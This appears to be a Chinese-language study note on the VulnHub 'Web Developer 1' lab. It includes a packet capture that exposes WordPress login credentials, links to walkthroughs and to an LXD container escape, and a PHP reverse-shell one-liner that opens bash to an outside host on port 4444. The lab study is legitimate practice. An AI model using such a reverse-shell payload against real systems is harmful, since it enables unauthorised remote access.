[https://www.vulnhub.com/entry/web-developer-1,288/](https://www.vulnhub.com/entry/web-developer-1,288/)
 
参考资料
   

数据包分析

![[WEB DEVELOPER 1 wordpress插件反弹shell image a1ffef8e0f6bcffa.png|Exported image]]   
Frame 180: 799 bytes on wire (6392 bits), 799 bytes captured (6392 bits)  
Ethernet II, Src: PCSSystemtec_74:17:d4 (08:00:27:74:17:d4), Dst: PCSSystemtec_1d:4d:40 (08:00:27:1d:4d:40)  
Internet Protocol Version 4, Src: 192.168.1.222, Dst: 192.168.1.176  
Transmission Control Protocol, Src Port: 49558, Dst Port: 80, Seq: 1, Ack: 1, Len: 733  
Hypertext Transfer Protocol  
POST /wordpress/wp-login.php HTTP/1.1\r\n  
[Expert Info (Chat/Sequence): POST /wordpress/wp-login.php HTTP/1.1\r\n]  
[POST /wordpress/wp-login.php HTTP/1.1\r\n]  
[Severity level: Chat]  
[Group: Sequence]  
Request Method: POST  
Request URI: /wordpress/wp-login.php  
Request Version: HTTP/1.1  
Host: 192.168.1.176\r\n  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n  
Accept-Language: en-US,en;q=0.5\r\n  
Accept-Encoding: gzip, deflate\r\n  
Referer: [http://192.168.1.176/wordpress/wp-login.php?redirect_to=http%3A%2F%2F192.168.1.176%2Fwordpress%2Fwp-admin%2F&reauth=1\r\n](http://192.168.1.176/wordpress/wp-login.php?redirect_to=http%3A%2F%2F192.168.1.176%2Fwordpress%2Fwp-admin%2F&reauth=1\r\n)  
Content-Type: application/x-www-form-urlencoded\r\n  
Content-Length: 152\r\n  
[Content length: 152]  
Cookie: wordpress_test_cookie=WP+Cookie+check\r\n  
Cookie pair: wordpress_test_cookie=WP+Cookie+check  
Connection: keep-alive\r\n  
Upgrade-Insecure-Requests: 1\r\n  
\r\n  
[Full request URI: [http://192.168.1.176/wordpress/wp-login.php](http://192.168.1.176/wordpress/wp-login.php)]  
[HTTP request 1/4]  
[Response in frame: 182]  
[Next request in frame: 184]  
File Data: 152 bytes  
HTML Form URL Encoded: application/x-www-form-urlencoded  
**Form item: "log" = "webdeveloper"**  
**Form item: "pwd" = "Te5eQg&4sBS!Yr$)wf%(DcAd"**  
Key: pwd  
Value: Te5eQg&4sBS!Yr$)wf%(DcAd  
Form item: "wp-submit" = "Log In"  
Form item: "redirect_to" = "[http://192.168.1.176/wordpress/wp-admin/](http://192.168.1.176/wordpress/wp-admin/)"  
Form item: "testcookie" = "1"
 
参考：  
[https://windsorwebdeveloper.com/web-developer-1-vulnhub-walkthrough/](https://windsorwebdeveloper.com/web-developer-1-vulnhub-walkthrough/)  
[https://reboare.github.io/lxd/lxd-escape.html](https://reboare.github.io/lxd/lxd-escape.html) 容器提权 数据包分析

![[WEB DEVELOPER 1 wordpress插件反弹shell image f71a3eefbcc5c057.png|Exported image]]   
\<?php exec("/bin/bash -c 'bash -i \> & /dev/tcp/www.xiaowang68.cn/4444 0\>&1'");?\>  
没有复现成功  
[https://palashmarele.medium.com/web-developer-1-walkthrough-vulnhub-3f26d3296ca6](https://palashmarele.medium.com/web-developer-1-walkthrough-vulnhub-3f26d3296ca6)
 ![[WEB DEVELOPER 1 wordpress插件反弹shell image c800ce0ed3ad8d05.png|Exported image]]  

直接使用容器进行查看文件提权的操作